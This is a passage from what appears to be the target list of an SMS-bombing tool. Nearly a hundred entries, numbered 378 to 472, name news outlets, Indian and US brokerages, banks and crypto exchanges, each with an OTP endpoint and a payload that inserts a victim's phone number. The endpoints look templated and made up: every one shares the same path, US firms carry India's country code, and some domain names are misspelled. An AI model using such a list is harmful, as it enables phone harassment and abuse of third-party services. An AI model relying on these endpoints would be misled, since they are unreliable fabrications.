    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 378
{
    'name': 'MSNBC_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.msnbc.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 379
{
    'name': 'ABC_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.abcnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 380
{
    'name': 'CBS_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cbsnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 381
{
    'name': 'NBC_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nbcnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 382
{
    'name': 'CNN_International_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cnninternational.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 383
{
    'name': 'BBC_World_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bbcworldnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 384
{
    'name': 'Reuters_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.reuters.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 385
{
    'name': 'Bloomberg_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bloomberg.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 386
{
    'name': 'Financial_Times_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ft.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 387
{
    'name': 'WSJ_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wsj.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 388
{
    'name': 'NYT_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nytimes.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 389
{
    'name': 'Washington_Post_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.washingtonpost.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 390
{
    'name': 'Guardian_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.theguardian.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 391
{
    'name': 'Telegraph_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.telegraph.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 392
{
    'name': 'Times_Of_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.timesofindia.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 393
{
    'name': 'Hindustan_Times_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hindustantimes.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 394
{
    'name': 'Indian_Express_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indianexpress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 395
{
    'name': 'The_Hindu_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.thehindu.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 396
{
    'name': 'Deccan_Herald_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.deccanherald.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 397
{
    'name': 'Business_Standard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.businessstandard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 398
{
    'name': 'Financial_Express_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.financialexpress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 399
{
    'name': 'Mint_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 400
{
    'name': 'Economic_Times_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.economictimes.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 401
{
    'name': 'NDTV_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ndtv.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 402
{
    'name': 'ABP_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.abpnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 403
{
    'name': 'Zee_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zeenews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 404
{
    'name': 'India_Today_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indiatoday.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 405
{
    'name': 'Outlook_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.outlookindia.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 406
{
    'name': 'Frontline_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.frontline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 407
{
    'name': 'Caravan_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.caravan.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 408
{
    'name': 'Scroll_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.scroll.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 409
{
    'name': 'The_Wire_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.thewire.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 410
{
    'name': 'The_Print_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.theprint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 411
{
    'name': 'News18_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news18.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 412
{
    'name': 'TV9_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tv9.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 413
{
    'name': 'Republic_TV_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.republictv.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 414
{
    'name': 'Times_Now_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.timesnow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 415
{
    'name': 'CNN_News18_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cnnnews18.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 416
{
    'name': 'IndiaTV_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indiatv.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 417
{
    'name': 'Aaj_Tak_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.aajtak.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 418
{
    'name': 'Zee_Business_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zeebusiness.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 419
{
    'name': 'ET_Now_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.etnow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 420
{
    'name': 'Bloomberg_Quint_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bloombergquint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 421
{
    'name': 'Moneycontrol_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.moneycontrol.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 422
{
    'name': 'Investopedia_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.investopedia.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 423
{
    'name': 'TradingView_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tradingview.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 424
{
    'name': 'Zerodha_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zerodha.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 425
{
    'name': 'Upstox_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.upstox.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 426
{
    'name': 'Groww_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.groww.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 427
{
    'name': 'Angel_One_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.angelone.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 428
{
    'name': '5Paisa_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.5paisa.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 429
{
    'name': 'Motilal_Oswal_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.motilaloswal.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 430
{
    'name': 'ICICI_Direct_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.icicidirect.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 431
{
    'name': 'HDFC_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hdfcsec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 432
{
    'name': 'Kotak_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kotaksec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 433
{
    'name': 'Sharekhan_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sharekhan.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 434
{
    'name': 'Edelweiss_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.edelweiss.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 435
{
    'name': 'SBI_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sbisec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 436
{
    'name': 'Axis_Direct_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.axisdirect.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 437
{
    'name': 'IIFL_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.iifl.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 438
{
    'name': 'Reliance_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.relianceSecurities.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 439
{
    'name': 'Indiabulls_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indiabulllssec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 440
{
    'name': 'Geojit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.geojit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 441
{
    'name': 'IDFC_First_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.idfcfirstsec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 442
{
    'name': 'Yes_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.yessecurities.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 443
{
    'name': 'Federal_Bank_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.federalbanksec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 444
{
    'name': 'DBS_Treasures_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dbstreasuries.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 445
{
    'name': 'HSBC_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hsbcsec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 446
{
    'name': 'Citibank_Securities_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.citibanksec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 447
{
    'name': 'Standard_Chartered_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sc.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 448
{
    'name': 'Deutsche_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.deutschebank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 449
{
    'name': 'Barclays_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.barclays.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 450
{
    'name': 'UBS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ubs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 451
{
    'name': 'Credit_Suisse_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.creditsuisse.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 452
{
    'name': 'Morgan_Stanley_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.morganstanley.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 453
{
    'name': 'Goldman_Sachs_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.goldmansachs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 454
{
    'name': 'JP_Morgan_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.jpmorgan.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 455
{
    'name': 'BlackRock_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blackrock.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 456
{
    'name': 'Vanguard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vanguard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 457
{
    'name': 'Fidelity_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fidelity.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 458
{
    'name': 'Schwab_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.schwab.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 459
{
    'name': 'E_Trade_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.etrade.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 460
{
    'name': 'Robinhood_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.robinhood.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 461
{
    'name': 'Webull_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.webull.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 462
{
    'name': 'M1_Finance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.m1finance.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 463
{
    'name': 'SoFi_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sofi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 464
{
    'name': 'Acorns_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.acorns.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 465
{
    'name': 'Betterment_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.betterment.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 466
{
    'name': 'Wealthfront_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wealthfront.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 467
{
    'name': 'Stash_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.stash.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 468
{
    'name': 'Public_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.public.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 469
{
    'name': 'Crypto.com_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.crypto.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 470
{
    'name': 'Binance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.binance.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 471
{
    'name': 'Coinbase_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coinbase.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 472
{
    'name': 'Kraken_SMS',
